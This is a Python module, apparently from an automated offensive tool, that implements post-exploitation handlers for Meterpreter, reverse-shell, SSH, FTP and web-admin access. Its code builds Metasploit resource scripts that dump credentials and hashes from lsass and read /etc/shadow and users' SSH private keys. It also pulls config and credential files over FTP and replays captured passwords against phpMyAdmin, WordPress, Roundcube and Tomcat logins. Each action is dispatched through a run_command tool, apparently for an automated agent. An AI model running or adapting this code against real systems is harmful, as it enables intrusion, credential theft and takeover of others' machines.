"""
PostAccessHandler — generic abstraction for post-access actions.

Decouples post-exploitation logic from the Metasploit-specific dispatcher,
allowing handlers for SSH, FTP, web-admin, API token access, etc.

Phase 3:
  - MeterpreterHandler  (msfconsole session + RC file)
  - ShellHandler        (raw reverse shell commands)
  - SSHAccessHandler    (ssh -l user target cmd)

Phase 4 additions:
  - FTPAccessHandler    (authenticated FTP enumeration)
  - WebAdminHandler     (curl-based credential reuse on web login forms)

Usage:
    handler = PostAccessHandler.for_session(session_record)
    result  = handler.execute(dispatcher, target, lhost, lport, cfg)
"""
from __future__ import annotations

import base64
import logging
import textwrap
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import Enum
from typing import Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


# ── access type ───────────────────────────────────────────────────────────────

class AccessType(str, Enum):
    METERPRETER = "meterpreter"
    SHELL       = "shell"
    SSH         = "ssh"
    FTP         = "ftp"
    WEB_ADMIN   = "web_admin"
    API_TOKEN   = "api_token"
    UNKNOWN     = "unknown"


# ── result ────────────────────────────────────────────────────────────────────

@dataclass
class PostAccessResult:
    """Outcome of a post-access handler execution."""

    access_type : AccessType
    success     : bool
    output      : str
    hashes      : list[dict]        # [{username, lm, ntlm}]
    credentials : list[dict]        # [{username, secret, kind}]
    artifacts   : list[str]         # file paths, ssh keys, etc.
    notes       : str               = ""

    @classmethod
    def failure(
        cls,
        access_type : AccessType,
        reason      : str = "",
    ) -> "PostAccessResult":
        return cls(
            access_type = access_type,
            success     = False,
            output      = "",
            hashes      = [],
            credentials = [],
            artifacts   = [],
            notes       = reason,
        )


# ── base handler ──────────────────────────────────────────────────────────────

class BasePostAccessHandler(ABC):
    """Abstract post-access handler."""

    access_type: AccessType = AccessType.UNKNOWN

    def __init__(
        self,
        log     : logging.Logger,
        session : dict,
    ) -> None:
        self.log     = log
        self.session = session

    @abstractmethod
    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        """Run post-access commands and return structured results."""
        ...

    def _default_commands(self, is_windows: bool) -> str:
        """Default post-access commands for the platform type."""
        if is_windows:
            return (
                "getuid;getsystem;migrate -N lsass.exe;"
                "load kiwi;creds_all;hashdump;"
                "run post/windows/gather/enum_shares"
            )
        return (
            "id;uname -a;cat /etc/passwd;"
            "cat /etc/shadow;ls -la /root;"
            "cat /home/*/.ssh/id_rsa 2>/dev/null"
        )


# ── meterpreter handler ───────────────────────────────────────────────────────

class MeterpreterHandler(BasePostAccessHandler):
    """
    Post-access via Metasploit meterpreter session.

    Re-runs the exploit module with a new port and executes
    post-exploitation commands via 'sessions -i -1 -C'.
    """

    access_type = AccessType.METERPRETER

    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        payload    = self.session.get("payload", "")
        is_windows = bool(payload and "windows" in payload.lower())
        module     = self.session.get("module",
                     "exploit/windows/smb/ms17_010_eternalblue")
        rport      = int(self.session.get("rport", 445))
        cmds       = self._default_commands(is_windows)

        cmd_block: list[str] = []
        for c in cmds.split(";"):
            c = c.strip()
            if c:
                cmd_block.append(f'sessions -i -1 -C "{c}"')
                cmd_block.append("sleep 4")

        is_aux = module.startswith("auxiliary/")
        payload_line = (
            "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
        )
        action_line = "run" if is_aux else "exploit -z"

        rc_content = textwrap.dedent(f"""\
            use {module}
            set RHOSTS {target}
            set RPORT {rport}
            set LHOST {lhost}
            set LPORT {lport}
            {payload_line}
            set ExitOnSession false
            set WfsDelay 30
            set EnableStageEncoding true
            {action_line}
            sleep 10
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 5
            sessions -K
            exit -y
        """)

        b64 = base64.b64encode(rc_content.encode()).decode()
        cmd = (
            f"printf '%s' '{b64}' | base64 -d > /tmp/hs_post.rc && "
            f"msfconsole -q -r /tmp/hs_post.rc 2>&1 ; "
            f"rm -f /tmp/hs_post.rc"
        )

        self.log.info("meterpreter post-access: %s lport %d", module, lport)
        try:
            t_name, output, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        except Exception as exc:  # noqa: BLE001
            self.log.error("meterpreter handler error: %s", exc)
            return PostAccessResult.failure(
                self.access_type, f"dispatch error: {exc}"
            )

        return PostAccessResult(
            access_type = self.access_type,
            success     = bool(output),
            output      = output,
            hashes      = [],      # caller (engine) parses from output
            credentials = [],
            artifacts   = [],
            notes       = f"module={module} lport={lport}",
        )


# ── shell handler ─────────────────────────────────────────────────────────────

class ShellHandler(BasePostAccessHandler):
    """
    Post-access via a raw reverse shell (cmd/unix/reverse, bash, nc, etc.).

    Builds a Metasploit listener for the shell payload and executes
    post-access shell commands.
    """

    access_type = AccessType.SHELL

    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        cmds = self._default_commands(is_windows=False)

        cmd_block: list[str] = []
        for c in cmds.split(";"):
            c = c.strip()
            if c:
                cmd_block.append(f'sessions -i -1 -C "{c}"')
                cmd_block.append("sleep 3")

        rc_content = textwrap.dedent(f"""\
            use multi/handler
            set PAYLOAD cmd/unix/reverse
            set LHOST {lhost}
            set LPORT {lport}
            set ExitOnSession false
            exploit -j -z
            sleep 15
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 3
            sessions -K
            exit -y
        """)

        b64 = base64.b64encode(rc_content.encode()).decode()
        cmd = (
            f"printf '%s' '{b64}' | base64 -d > /tmp/hs_shell.rc && "
            f"msfconsole -q -r /tmp/hs_shell.rc 2>&1 ; "
            f"rm -f /tmp/hs_shell.rc"
        )

        self.log.info("shell post-access handler lport %d", lport)
        try:
            _, output, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        except Exception as exc:  # noqa: BLE001
            self.log.error("shell handler error: %s", exc)
            return PostAccessResult.failure(
                self.access_type, f"dispatch error: {exc}"
            )

        return PostAccessResult(
            access_type = self.access_type,
            success     = bool(output),
            output      = output,
            hashes      = [],
            credentials = [],
            artifacts   = [],
            notes       = f"shell reverse lport={lport}",
        )


# ── SSH handler (stub — Phase 4) ──────────────────────────────────────────────

class SSHAccessHandler(BasePostAccessHandler):
    """
    Post-access via authenticated SSH session.

    Executes enumeration commands over SSH using captured credentials.
    Phase 3 stub — requires credential_reuse path to be implemented.
    """

    access_type = AccessType.SSH

    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        username = self.session.get("username", "")
        password = self.session.get("password", "")
        if not (username and password):
            return PostAccessResult.failure(
                self.access_type, "no credentials in session record"
            )
        cmds = self._default_commands(is_windows=False)
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=10 {username}@{target} "
            f"'{cmds.replace(';', ' ; ')}' 2>&1"
        )
        self.log.info("ssh post-access: %s@%s", username, target)
        try:
            _, output, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        except Exception as exc:  # noqa: BLE001
            return PostAccessResult.failure(
                self.access_type, f"ssh error: {exc}"
            )
        return PostAccessResult(
            access_type = self.access_type,
            success     = bool(output),
            output      = output,
            hashes      = [],
            credentials = [],
            artifacts   = [],
            notes       = f"ssh {username}@{target}",
        )


# ── FTP access handler ────────────────────────────────────────────────────────

class FTPAccessHandler(BasePostAccessHandler):
    """
    Post-access enumeration via authenticated FTP session.

    Phase 4 — uses curl to authenticate and list directory structure.
    Captures file listings and attempts to retrieve interesting files
    such as /etc/passwd, .bash_history, web config files, etc.
    """

    access_type = AccessType.FTP

    # Files to attempt to retrieve
    INTERESTING_PATHS = [
        "/etc/passwd",
        "/etc/shadow",
        ".bash_history",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/home/*/.ssh/authorized_keys",
    ]

    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        username = self.session.get("username", "")
        password = self.session.get("password", self.session.get("secret", ""))
        rport    = int(self.session.get("rport", 21))

        if not (username and password):
            return PostAccessResult.failure(
                self.access_type, "no credentials in session record"
            )

        self.log.info("ftp post-access: %s@%s:%d", username, target, rport)
        output_parts: list[str] = []
        artifacts:    list[str] = []

        # ── step 1: list root directory ───────────────────────────────────
        list_cmd = (
            f"curl -s --connect-timeout 10 "
            f"--user '{username}:{password}' "
            f"ftp://{target}:{rport}/ 2>&1"
        )
        try:
            _, listing, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": list_cmd}}
            )
            if listing:
                output_parts.append(f"=== FTP ROOT LISTING ===\n{listing}")
        except Exception as exc:  # noqa: BLE001
            return PostAccessResult.failure(
                self.access_type, f"ftp listing error: {exc}"
            )

        if not listing or "error" in listing.lower() or "failed" in listing.lower():
            return PostAccessResult.failure(
                self.access_type, "ftp authentication failed or no listing"
            )

        # ── step 2: attempt to retrieve interesting files ─────────────────
        for path in self.INTERESTING_PATHS:
            try:
                get_cmd = (
                    f"curl -s --connect-timeout 8 "
                    f"--user '{username}:{password}' "
                    f"ftp://{target}:{rport}{path} 2>&1"
                )
                _, content, _ = dispatcher.dispatch(
                    {"tool": "run_command", "args": {"command": get_cmd}}
                )
                if content and "error" not in content.lower()[:50]:
                    output_parts.append(
                        f"=== {path} ===\n{content[:2000]}"
                    )
                    artifacts.append(path)
            except Exception:  # noqa: BLE001
                pass   # file not accessible — silently skip

        full_output = "\n\n".join(output_parts)
        return PostAccessResult(
            access_type = self.access_type,
            success     = bool(full_output),
            output      = full_output,
            hashes      = [],
            credentials = [],
            artifacts   = artifacts,
            notes       = (
                f"ftp {username}@{target}:{rport}  "
                f"files retrieved: {len(artifacts)}"
            ),
        )


# ── web admin handler ─────────────────────────────────────────────────────────

class WebAdminHandler(BasePostAccessHandler):
    """
    Post-access credential reuse against web admin login forms.

    Phase 4 — tries captured credentials against common web admin paths
    using curl POST requests. Not a full brute-forcer — it attempts
    credential reuse from previously captured secrets.

    Supported targets (auto-detected from URL):
      - Generic HTTP form (POST username/password)
      - phpMyAdmin (/phpmyadmin/index.php)
      - WordPress (/wp-login.php)
      - Roundcube (/webmail, /roundcube)
    """

    access_type = AccessType.WEB_ADMIN

    # Common web login paths and their POST field names
    _PROFILES: list[dict] = [
        {
            "path"       : "/phpmyadmin/index.php",
            "user_field" : "pma_username",
            "pass_field" : "pma_password",
            "success_str": "phpMyAdmin",
            "label"      : "phpMyAdmin",
        },
        {
            "path"       : "/wp-login.php",
            "user_field" : "log",
            "pass_field" : "pwd",
            "success_str": "wp-admin",
            "label"      : "WordPress",
        },
        {
            "path"       : "/webmail/index.php",
            "user_field" : "_user",
            "pass_field" : "_pass",
            "success_str": "roundcube",
            "label"      : "Roundcube",
        },
        {
            "path"       : "/manager/html",
            "user_field" : None,    # HTTP basic auth
            "pass_field" : None,
            "success_str": "tomcat",
            "label"      : "Tomcat Manager",
        },
    ]

    def execute(
        self,
        dispatcher : "Dispatcher",
        target     : str,
        lhost      : str,
        lport      : int,
        cfg        : dict,
    ) -> PostAccessResult:
        username  = self.session.get("username", "")
        password  = self.session.get("password", self.session.get("secret", ""))
        rport     = int(self.session.get("rport", 80))
        scheme    = "https" if rport == 443 else "http"

        if not (username and password):
            return PostAccessResult.failure(
                self.access_type, "no credentials in session record"
            )

        self.log.info(
            "web admin post-access: %s@%s:%d", username, target, rport
        )
        output_parts: list[str] = []
        successes:    list[str] = []

        for profile in self._PROFILES:
            url = f"{scheme}://{target}:{rport}{profile['path']}"

            # HTTP Basic Auth path (Tomcat, etc.)
            if profile["user_field"] is None:
                cmd = (
                    f"curl -s -o /dev/null -w '%{{http_code}}' "
                    f"--connect-timeout 8 "
                    f"-u '{username}:{password}' "
                    f"{url} 2>&1"
                )
            else:
                # POST form login
                data = (
                    f"{profile['user_field']}={username}"
                    f"&{profile['pass_field']}={password}"
                )
                cmd = (
                    f"curl -s -L --connect-timeout 8 "
                    f"-c /tmp/hs_web_cookie.txt "
                    f"-d '{data}' "
                    f"'{url}' 2>&1"
                )

            try:
                _, response, _ = dispatcher.dispatch(
                    {"tool": "run_command", "args": {"command": cmd}}
                )
            except Exception:  # noqa: BLE001
                continue

            if not response:
                continue

            # Detect success
            success = (
                profile["success_str"].lower() in response.lower()
                or (profile["user_field"] is None and response.strip() == "200")
            )

            if success:
                successes.append(f"{profile['label']}: {url}")
                output_parts.append(
                    f"=== {profile['label']} LOGIN SUCCESS ===\n"
                    f"URL: {url}\n"
                    f"User: {username}\n"
                    f"Response sample: {response[:500]}"
                )
            else:
                output_parts.append(
                    f"=== {profile['label']} — no access at {url} ==="
                )

        # Cleanup cookie jar
        try:
            dispatcher.dispatch({
                "tool": "run_command",
                "args": {"command": "rm -f /tmp/hs_web_cookie.txt"}
            })
        except Exception:  # noqa: BLE001
            pass

        full_output = "\n\n".join(output_parts)
        return PostAccessResult(
            access_type = self.access_type,
            success     = bool(successes),
            output      = full_output,
            hashes      = [],
            credentials = [],
            artifacts   = successes,
            notes       = (
                f"web admin: {len(successes)} access point(s) confirmed"
                if successes
                else "web admin: no access gained"
            ),
        )


# ── factory ───────────────────────────────────────────────────────────────────

class PostAccessHandler:
    """
    Factory — select the correct handler from a session record or access type.
    """

    _REGISTRY: dict[AccessType, type[BasePostAccessHandler]] = {
        AccessType.METERPRETER: MeterpreterHandler,
        AccessType.SHELL      : ShellHandler,
        AccessType.SSH        : SSHAccessHandler,
        AccessType.FTP        : FTPAccessHandler,
        AccessType.WEB_ADMIN  : WebAdminHandler,
    }

    @classmethod
    def for_session(
        cls,
        session    : dict,
        log        : logging.Logger,
        access_type: Optional[AccessType] = None,
    ) -> BasePostAccessHandler:
        """
        Return the appropriate handler for a session record.

        access_type overrides auto-detection. Auto-detection checks:
        - session["payload"] for "meterpreter" → MeterpreterHandler
        - session["payload"] for "cmd/unix/reverse" → ShellHandler
        - session["payload"] == "ftp" → FTPAccessHandler
        - session["payload"] == "web_admin" → WebAdminHandler
        - session["username"] present → SSHAccessHandler
        - default → MeterpreterHandler
        """
        if access_type:
            handler_cls = cls._REGISTRY.get(access_type, MeterpreterHandler)
            return handler_cls(log, session)

        payload = str(session.get("payload", "")).lower()
        if "meterpreter" in payload:
            return MeterpreterHandler(log, session)
        if "cmd/unix" in payload or ("shell" in payload and "web" not in payload):
            return ShellHandler(log, session)
        if payload == "ftp":
            return FTPAccessHandler(log, session)
        if payload in ("web_admin", "http", "https"):
            return WebAdminHandler(log, session)
        if session.get("username"):
            return SSHAccessHandler(log, session)
        return MeterpreterHandler(log, session)

    @classmethod
    def register(
        cls,
        access_type : AccessType,
        handler_cls : type[BasePostAccessHandler],
    ) -> None:
        """Register a new handler type (extension point for future phases)."""
        cls._REGISTRY[access_type] = handler_cls
